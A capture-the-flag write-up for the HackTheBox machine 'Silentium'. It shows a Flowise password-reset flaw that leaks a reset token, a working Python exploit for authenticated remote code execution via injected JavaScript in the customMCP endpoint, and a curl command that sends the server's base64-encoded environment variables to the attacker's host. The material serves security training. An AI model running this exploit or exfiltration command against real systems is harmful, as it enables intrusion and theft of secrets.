# Silentium: HackTheBox Machine

Difficulty: Easy

## Enumeration

Ports 22,80 were open. 

On doing some fuzzing (see previous writeups on how to do that), we found these subdomains

- silentium.htb
- staging.silentium.htb


## Initial Foothold

- silentium.htb is running a generic website but, it has some names in it, like Marcus Thorne, Ben and Elena Rossi.
- staging.silentium.htb is running a *Flowise* instance. 

> Flowise: A tool made for building AI agents visually

The exploit for this stage is not entirely straightforward and might be the trickiest part of the box. So I'll explain it step by step.

1. Flowise is vulnerable to [this exploit](https://github.com/advisories/GHSA-3gcm-f6qx-ff7p), but it requires authentication. So we need to find a way to recover the credentials or gain access.
2. In the login page, we can see a forgot password functionality which accepts the email and sends an email if it exists.
3. I did some educated guessing here and set `ben@silentium.htb` as the email. This is because he was mentioned as the technical guy on the main site.
4. Check the password reset request in BurpSuite. We see this:

Request:

```
POST /api/v1/account/forgot-password HTTP/1.1
Host: staging.silentium.htb
Content-Length: 38
x-request-from: internal
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
Content-Type: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Origin: http://staging.silentium.htb
Referer: http://staging.silentium.htb/forgot-password
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"user":{"email":"ben@silentium.htb"}}
```

Response:

```
HTTP/1.1 201 Created
Server: nginx/1.24.0 (Ubuntu)
Date: Sun, 26 Apr 2026 14:04:47 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 579
Connection: keep-alive
Access-Control-Allow-Origin: http://staging.silentium.htb
Vary: Origin
Access-Control-Allow-Credentials: true
ETag: W/"243-0RUOwbWps/HT3JiH4zjls03wOkM"

{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG","tempToken":"jDC9I7mghWgMo4BC3CYc1Txdbx4gWJdq08IW0E0MpYFHcysQT839MZSBBckssPC1","tokenExpiry":"2026-04-26T14:19:47.072Z","status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-04-26T14:04:47.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}}
```

The tempToken in the response is what we'll use to do a password reset.

5. Now in `http://staging.silentium.htb/reset-password`, enter the credentials you want and enter this tempToken where it prompts you for a reset token (I generated a secure password using `pwgen -cny 12 1`). This gives us access to the flowise dashboard.
6. Now that we've reset the password we can exploit the authenticated RCE. I built my own python script for doing that, as given below:

```python
import requests
import sys

if not len(sys.argv) == 4:
    print(f"Usage: python3 {sys.argv[0]} <url> <apikey> <cmd>")
    exit(1)

url, api_key, cmd = sys.argv[1], sys.argv[2], sys.argv[3]


if url[-1] == "/":
    url = url[:-1]

url = f"{url}/api/v1/node-load-method/customMCP"

headers = {
    "Content-Type":"application/json",
    "Authorization":f"Bearer {api_key}"
}

json = {
    "loadMethod": "listActions",
    "inputs":{
        "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\""+cmd+"\");return 1;})()})"
    }
}

res = requests.post(url, headers=headers, json=json)
print(res.status_code)
print(res.text)
```

7. Using the **default API key** that you can find at `http://staging.silentium.htb/apikey`, run this exploit and try to enumerate the filesystem. I got the password to the ssh user `ben` using this command.

```bash
python exploit.py http://staging.silentium.htb your-token 'curl http://<your-python-http-server>:8000/$(env| base64 -w0)'
```

8. This gives the password to `ben@silentum.htb`, giving us the user flag.


## Privilege Escalation

- On doing `ss -tulnp` we get that port 3001 is active. This is running the gogs service. On analyzing the page source of this page I found this subdomain `staging-v2-code.dev.silentium.htb` which also points to it. So we can access this without port forwarding on our attacker machine.

- Register a user here and run [this exploit](https://github.com/TYehan/CVE-2025-8110-Gogs-RCE-Exploit) to gain a root shell.


Happy Hacking :)
